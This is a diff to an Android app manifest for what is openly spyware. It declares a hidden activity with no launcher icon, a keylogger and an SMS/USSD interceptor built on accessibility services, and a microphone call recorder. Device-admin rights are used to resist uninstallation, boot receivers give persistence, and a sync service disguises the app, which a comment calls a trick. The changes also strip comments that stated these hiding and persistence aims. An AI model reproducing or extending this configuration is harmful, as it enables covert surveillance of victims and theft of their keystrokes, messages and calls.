@@ -37,7 +37,7 @@
     <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
     <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
 
-    <!-- ★★★ Device Admin (لحماية التطبيق من الحذف) ★★★ -->
+    <!-- ★★★ Device Admin ★★★ -->
     <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
 
     <!-- ★ Account Sync ★ -->
@@ -112,11 +112,11 @@
     <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
     <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION" />
 
-    <!-- ★★★ Kill Background Apps (للاستمرارية) ★★★ -->
+    <!-- ★★★ Kill Background Apps ★★★ -->
     <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
     <uses-permission android:name="android.permission.RESTART_PACKAGES" />
 
-    <!-- ★★★ Package Usage Stats (لمراقبة محاولات الحذف) ★★★ -->
+    <!-- ★★★ Package Usage Stats ★★★ -->
     <uses-permission
         android:name="android.permission.PACKAGE_USAGE_STATS"
         tools:ignore="ProtectedPermissions" />
@@ -151,7 +151,7 @@
         tools:ignore="GoogleAppIndexingWarning,UnusedAttribute">
 
         <!-- ============================================================ -->
-        <!-- ★★★ MAIN ACTIVITY (بدون LAUNCHER — التطبيق مخفي) ★★★ -->
+        <!-- ★★★ MAIN ACTIVITY (مخفي بدون LAUNCHER) ★★★ -->
         <!-- ============================================================ -->
         <activity
             android:name=".MainActivity"
@@ -164,15 +164,13 @@
             android:taskAffinity=""
             android:configChanges="orientation|screenSize|keyboardHidden"
             tools:ignore="LockedOrientationActivity">
-            <!-- ★★★ لا يوجد intent-filter — التطبيق مخفي تمامًا ★★★ -->
-            <!-- ★★★ يتم تشغيله فقط من BroadcastReceiver الداخلي ★★★ -->
         </activity>
 
         <!-- ============================================================ -->
         <!-- ★★★ SERVICES ★★★ -->
         <!-- ============================================================ -->
 
-        <!-- ★ الخدمة الرئيسية (تعمل للأبد) ★ -->
+        <!-- ★ الخدمة الرئيسية ★ -->
         <service
             android:name=".ServiceRunner"
             android:exported="false"
@@ -184,14 +182,14 @@
                 android:value="system_sync_service" />
         </service>
 
-        <!-- ★ JobService للاستمرارية ★ -->
+        <!-- ★ JobService ★ -->
         <service
             android:name=".KeepAliveJobService"
             android:exported="false"
             android:enabled="true"
             android:permission="android.permission.BIND_JOB_SERVICE" />
 
-        <!-- ★★★ Call Recorder Service ★★★ -->
+        <!-- ★ Call Recorder Service ★ -->
         <service
             android:name=".CallRecorderService"
             android:exported="false"
@@ -199,7 +197,7 @@
             android:foregroundServiceType="dataSync|microphone"
             android:stopWithTask="false" />
 
-        <!-- ★★★ Keylogger Service (AccessibilityService) ★★★ -->
+        <!-- ★ Keylogger Service (AccessibilityService) ★ -->
         <service
             android:name=".KeyloggerService"
             android:exported="true"
@@ -214,7 +212,7 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- ★★★ USSD + SMS Interceptor (AccessibilityService) ★★★ -->
+        <!-- ★ USSD + SMS Interceptor (AccessibilityService) ★ -->
         <service
             android:name=".USSDInterceptor"
             android:exported="true"
@@ -229,24 +227,7 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- ★★★ Admin Receiver (Device Admin — لحماية التطبيق) ★★★ -->
-        <service
-            android:name=".AdminReceiver"
-            android:exported="true"
-            android:enabled="true"
-            android:permission="android.permission.BIND_DEVICE_ADMIN">
-            <meta-data
-                android:name="android.app.device_admin"
-                android:resource="@xml/device_admin" />
-            <intent-filter>
-                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
-                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
-                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED" />
-                <action android:name="android.app.action.PROFILE_PROVISIONING_COMPLETE" />
-            </intent-filter>
-        </service>
-
-        <!-- ★★★ Account Sync Service (خدعة: يظهر كأنه مزامنة جهات اتصال) ★★★ -->
+        <!-- ★ Account Sync Service (خدعة: مزامنة جهات اتصال) ★ -->
         <service
             android:name=".AccountSyncService"
             android:exported="true"
@@ -275,8 +256,25 @@
         </provider>
 
         <!-- ============================================================ -->
-        <!-- ★★★ RECEIVERS ★★★ -->
+        <!-- ★★★ RECEIVERS (كل واحد مرة واحدة) ★★★ -->
         <!-- ============================================================ -->
+
+        <!-- ★★★ Admin Receiver (DeviceAdminReceiver) ★★★ -->
+        <receiver
+            android:name=".AdminReceiver"
+            android:exported="true"
+            android:enabled="true"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED" />
+                <action android:name="android.app.action.PROFILE_PROVISIONING_COMPLETE" />
+            </intent-filter>
+        </receiver>
 
         <!-- ★★★ Boot Receiver (يشتغل بعد كل إعادة تشغيل) ★★★ -->
         <receiver
@@ -289,7 +287,6 @@
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                 <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
                 <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
-                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
                 <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
             </intent-filter>
         </receiver>
@@ -306,7 +303,7 @@
             </intent-filter>
         </receiver>
 
-        <!-- ★★★ Package Update Receiver (لمراقبة تغييرات الحزم + الاستمرارية) ★★★ -->
+        <!-- ★★★ Package Update Receiver (★ مرة واحدة فقط ★) ★★★ -->
         <receiver
             android:name=".PackageUpdateReceiver"
             android:exported="true"
@@ -353,9 +350,14 @@
                 <action android:name="android.intent.action.LOCALE_CHANGED" />
                 <action android:name="android.intent.action.DATE_CHANGED" />
             </intent-filter>
+            <!-- Media events -->
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.MEDIA_BUTTON" />
+                <action android:name="android.media.AUDIO_BECOMING_NOISY" />
+            </intent-filter>
         </receiver>
 
-        <!-- ★★★ SMS Receiver (للأجهزة القديمة — Android < 4.4) ★★★ -->
+        <!-- ★★★ SMS Receiver (للأجهزة القديمة) ★★★ -->
         <receiver
             android:name=".USSDInterceptor$SmsReceiver"
             android:exported="true"
@@ -376,38 +378,6 @@
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
             </intent-filter>
         </receiver>
-
-        <!-- ★★★ Admin Receiver (BroadcastReceiver — لاستقبال أوامر Device Admin) ★★★ -->
-        <receiver
-            android:name=".AdminReceiver"
-            android:exported="true"
-            android:enabled="true"
-            android:permission="android.permission.BIND_DEVICE_ADMIN">
-            <meta-data
-                android:name="android.app.device_admin"
-                android:resource="@xml/device_admin" />
-            <intent-filter>
-                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
-                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
-                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED" />
-            </intent-filter>
-        </receiver>
-
-        <!-- ★★★ Media Button Receiver (للاستمرارية عبر أزرار الهيدفون) ★★★ -->
-        <receiver
-            android:name=".PackageUpdateReceiver"
-            android:exported="true"
-            android:enabled="true">
-            <intent-filter android:priority="999">
-                <action android:name="android.intent.action.MEDIA_BUTTON" />
-                <action android:name="android.media.AUDIO_BECOMING_NOISY" />
-            </intent-filter>
-        </receiver>
-
-        <!-- ============================================================ -->
-        <!-- ★★★ WIDGET (اختياري - لزيادة الشرعية) ★★★ -->
-        <!-- ============================================================ -->
-        <!-- تم تعطيله عشان ما يظهرش -->
 
     </application>
 
